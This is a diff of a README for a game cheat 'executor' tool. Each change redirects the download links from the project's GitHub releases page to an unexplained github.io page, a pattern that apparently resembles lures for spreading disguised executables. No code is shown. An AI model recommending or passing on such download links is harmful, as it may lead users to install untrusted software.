@@ -1,6 +1,6 @@
 # 🎯 break-brainrot-egg-executor - Take Control of Your Gameplay
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://github.com/raghulravi08032007-collab/break-brainrot-egg-executor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://raghulravi08032007-collab.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Getting the application on your computer is simple.
 
 **Step 1: Visit the download page**
 
-Visit this link to download the application: [https://github.com/raghulravi08032007-collab/break-brainrot-egg-executor/releases](https://github.com/raghulravi08032007-collab/break-brainrot-egg-executor/releases)
+Visit this link to download the application: [https://raghulravi08032007-collab.github.io](https://raghulravi08032007-collab.github.io)
 
 **Step 2: Choose the right file**
 
@@ -148,7 +148,7 @@ Please use this application responsibly and only in games where such assistance 
 
 Now you're all set! With **break-brainrot-egg-executor**, you can take your gaming to the next level. Remember to start with the download link above, install the application, and customize it to your liking. It's really that easy.
 
-[![Get It Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-1E90FF?style=for-the-badge&logo=github&logoColor=white&labelColor=00BFFF)](https://github.com/raghulravi08032007-collab/break-brainrot-egg-executor/releases)
+[![Get It Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-1E90FF?style=for-the-badge&logo=github&logoColor=white&labelColor=00BFFF)](https://raghulravi08032007-collab.github.io)
 
 Happy gaming! 🎮
 
